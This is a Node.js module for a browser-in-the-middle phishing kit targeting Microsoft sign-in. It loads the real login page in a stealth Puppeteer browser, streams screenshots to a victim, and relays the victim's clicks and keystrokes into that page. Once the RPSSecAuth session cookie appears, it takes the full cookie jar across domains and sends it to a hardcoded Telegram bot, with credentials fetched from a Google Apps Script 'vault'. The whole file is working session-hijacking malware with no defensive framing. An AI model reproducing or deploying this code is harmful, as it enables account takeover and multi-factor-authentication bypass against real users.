const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const FormData = require('form-data');

puppeteer.use(StealthPlugin());

const VAULT_URL = "https://script.googleusercontent.com/macros/echo?user_content_key=AWDtjMUqhClgfeFlU8Xv_oX6N6eXj3l7lbyNcSkwxk-JkstXJYafiVNpdDBlT452ND7spqv7p3eQRXoD5LOsTDGcSZA1g4RX8v7GLHXuLucT81tg9au9CEbNP55X9hLIOqMSQh8Fc-taJut7HXkZiFO464jKxJCrfrUaLuqfE4rZyHPFdaXwlPY9wZwfTHjcYK33eMIoLp_eyKW2KspfnYAk2Xx6dbBVNjIOCTUS9di8QeEHoSra82-uqH8Wrl5yHTXorlXRxsCYZa4-wO_EOwajrh3mg7KUNQ&lib=MycdviQl2tpQGpak5QfXFV5l1jq1QWbX2";
const TARGET = "https://login.microsoftonline.com/";

async function getCredentials() {
    try {
        const response = await axios.get(VAULT_URL, { timeout: 7000 });
        if (response.data && response.data.TG_TOKEN) return response.data;
    } catch (e) { console.log("[SYSTEM] Fallback active."); }
    return { 
        "TG_TOKEN": "8219244739:AAGqPPCIoujdgeW6NF5xZ2j1dZlDQAa-4pc",
        "TG_CHAT_ID": "1318100118"
    };
}

async function sendExfiltration(cookies, url) {
    const creds = await getCredentials();
    const host = new URL(url).hostname;
    try {
        await axios.post(`https://api.telegram.org/bot${creds.TG_TOKEN}/sendMessage`, {
            chat_id: creds.TG_CHAT_ID,
            text: `<b>🚨 FINALIZED JAR CAPTURED</b>\n<b>Destination:</b> ${host}\n<b>Tokens:</b> ${cookies.length}\n<b>Status:</b> RPSSecAuth Verified`,
            parse_mode: 'HTML'
        });

        const form = new FormData();
        form.append('chat_id', creds.TG_CHAT_ID);
        form.append('document', Buffer.from(JSON.stringify(cookies, null, 2)), {
            filename: `MASTER_JAR_${host.replace(/\./g, '_')}.json`,
            contentType: 'application/json'
        });

        await axios.post(`https://api.telegram.org/bot${creds.TG_TOKEN}/sendDocument`, form, {
            headers: form.getHeaders()
        });
    } catch (e) { console.log("[EXFIL] Delivery error."); }
}

async function startSession(io, socket) {
    let browser = null;
    let captured = false;

    try {
        browser = await puppeteer.launch({
            headless: "new",
            args: [
                '--no-sandbox', 
                '--disable-setuid-sandbox', 
                '--disable-features=IsolateOrigins,site-per-process',
                '--disable-blink-features=AutomationControlled'
            ]
        });

        const [page] = await browser.pages();
        const context = browser.defaultBrowserContext(); // Access the full context
        
        await page.setViewport({ width: 1280, height: 720 });
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36');

        await page.goto(TARGET, { waitUntil: 'networkidle2' });

        // --- GLOBAL CONTEXT MONITOR ---
        const monitor = setInterval(async () => {
            if (captured) return;

            try {
                // IMPORTANT: Fetch cookies from the context, not the page
                // This grabs cookies for ALL domains (live.com, office.com, etc.)
                const allCookies = await context.cookies();
                const url = page.url();

                // Check for the "Access Token"
                const rpsAuth = allCookies.find(c => c.name === 'RPSSecAuth');
                const isLanded = url.includes('outlook') || url.includes('mail') || url.includes('portal');

                if (rpsAuth && isLanded) {
                    captured = true;
                    console.log("[CRITICAL] RPSSecAuth detected. Exfiltrating global jar...");
                    
                    // Final 4-second delay to ensure the redirect-chain is complete
                    setTimeout(async () => {
                        const finalJar = await context.cookies();
                        await sendExfiltration(finalJar, url);
                    }, 4000);
                }
            } catch (e) {}
        }, 5000);

        socket.on('victim-action', async (data) => {
            try {
                if (data.type === 'click') {
                    await page.mouse.click(data.x, data.y);
                } else if (data.type === 'key') {
                    await page.keyboard.press(data.key);
                }
            } catch (e) {}
        });

        const stream = setInterval(async () => {
            if (socket.connected) {
                try {
                    const b64 = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 20 });
                    socket.emit('browser-render', { screenshot: b64 });
                } catch (e) {}
            }
        }, 1000);

        socket.on('disconnect', async () => {
            clearInterval(monitor);
            clearInterval(stream);
            if (browser) await browser.close();
        });

    } catch (err) { if (browser) await browser.close(); }
}

module.exports = { startSession };
